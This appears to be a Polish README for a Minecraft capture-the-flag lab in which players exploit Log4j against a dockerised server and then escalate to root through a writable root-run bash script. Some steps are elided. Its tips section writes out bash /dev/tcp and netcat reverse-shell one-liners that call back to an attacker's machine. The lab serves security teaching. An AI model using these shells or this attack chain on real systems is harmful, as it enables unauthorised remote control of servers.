# minecraft-ctf

- próbujesz uruchomić sklauncher (jak nie masz javy, to se pobierz i zainstaluj)
- dockera też potrzebujesz (duh)
- odpalasz docer compose
- to ci uruchamia 3 kontenery
- dwa są tak jakby 'twoje', marshaller i httpcode. 'twoje' oznacza, że w topologii realnej są procesami, które ty kontrolujesz i stawiasz na swoim kompie, tutaj są w dockerach, żeby usprawnić całość,
- twoje zadanie jest następujące: zdobyć flagę wykorzystując podatność Log4j i kilka innych rzeczy :DD
- w tym celu:
  1. Uruchom Minecraft:
     1. Odpalasz SKLauncher, wybierasz tryb ofline,
     2. Klikasz + po prawej od "Installations Manager",
     3. Wybierasz release 1.8.8, SAVE, potem PLAY,
  2. Uruchom server mc (przy okazji inne kontenery):
     1. W repo komenda: `docker-compose up` albo `docker compose up`, uruchomi ci wszystkie kontenery, m.in. server minecrafta,
  3. 
  4. masz za zadanie wykorzystać podatność Log4j,
  5. kod hostowany na httpcode musisz przygotować i skompilować (kompilacja się dzieje podczas budowania kontenera),
  6. kod musi ci umożliwić kontrole na serverze
  7.  musisz znaleźć skrypt bashowy wykonywany z uprawnieniami roota, który możesz zmodyfikować,
  8.  zmodyfikować go tak, by ...
  9.  ...
  10. teraz masz dostęp do pliku z flagą,
  11. wyślij screen flagi na upela ;D
  12. udanej zabawy!



Przydatne rzeczy:

Reverse shell:
```sh
# https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

# odpalasz nasluchiwanie tcp na porcie `5000` na swoim kompie
nc -l 5000

# na kompie ofiary na którym możesz uruchomić komendę robisz
# (musisz wejść w basha - czyli wpisz `bash` w terminal)
# (w zsh /dev/tcp/[ip]/[port] nie działa )
bash -i >& /dev/tcp/[ip mojego kompa]/5000 0>&1
# albo to (ale mi nie działało)
nc [ip mojego kompa] 5000 –e /bin/bash


# Możesz to przetestować robiąc w jednym terminalu
nc -l 5000
# a w drugim
bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
```

Zbudowanie i uruchomienie kontenera:
```bash
# budowanie obrazu:
docker build . -t nazwa-obrazu
docker build . -t nazwa-obrazu:wersja

# uruchomienie obrazu (wtedy mamy uruchomiony kontener)
docker run -p 25565:25565 -ti 
```



Credits:
https://github.com/Justin-Garey/Minecraft-Log4j-Exploit
https://github.com/mbechler/marshalsec
https://lipanski.com/posts/smallest-docker-image-static-website




